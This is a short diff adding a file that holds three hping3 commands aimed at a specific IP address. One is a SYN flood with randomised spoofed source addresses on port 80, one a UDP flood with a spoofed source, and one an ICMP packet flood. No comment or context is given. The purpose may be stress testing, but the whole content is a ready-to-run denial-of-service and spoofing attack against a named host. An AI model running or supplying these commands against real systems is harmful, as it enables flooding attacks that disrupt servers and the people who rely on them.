@@ -1,0 +1,6 @@
+hping3 -S --flood --rand-source -p 80 -c 10000 138.197.143.231
+
+hping3 --udp -c 9000 -i u10000 -a SPOOFED_IP 138.197.143.231
+
+hping3 -1 -d 1000 -i u13333 -c 11000 138.197.143.231
+
